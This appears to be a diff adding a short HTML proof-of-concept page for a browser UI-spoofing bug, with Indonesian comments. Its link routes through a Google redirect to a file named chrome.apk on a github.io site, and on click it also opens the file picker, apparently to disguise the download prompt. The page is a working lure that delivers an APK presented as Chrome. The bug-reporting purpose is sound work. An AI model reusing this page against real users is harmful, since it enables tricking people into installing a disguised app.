@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC UI Spoofing & File / APK Trigger</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        button, a.button-link {
+            display: inline-block;
+            margin: 10px;
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+        }
+        button:hover, a.button-link:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>PoC Test Page</h1>
+    <p>Silakan uji tombol di bawah ini:</p>
+
+    <!-- Tombol Asli (Tidak diubah) -->
+    <div>
+        <button id="openPickerBtn">Open New Window & Upload Photo</button>
+    </div>
+
+    <!-- Tombol Baru dengan URL Redirect Google yang Lengkap -->
+    <div>
+        <a href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" class="button-link" id="downloadApkBtn">
+            Open New Window & Download APK
+        </a>
+    </div>
+
+    <script>
+        // Logika asli Anda tetap utuh dipertahankan di sini
+        document.getElementById('openPickerBtn').addEventListener('click', async () => {
+            try {
+                if (window.showOpenFilePicker) {
+                    const handles = await window.showOpenFilePicker();
+                    console.log(handles);
+                } else {
+                    alert('File System Access API tidak didukung di browser ini.');
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        });
+
+        // Logika tambahan untuk tombol APK dengan penanganan pemicu serupa
+        document.getElementById('downloadApkBtn').addEventListener('click', function(e) {
+            try {
+                if (window.showOpenFilePicker) {
+                    window.showOpenFilePicker().catch(() => {});
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        });
+    </script>
+
+</body>
+</html>
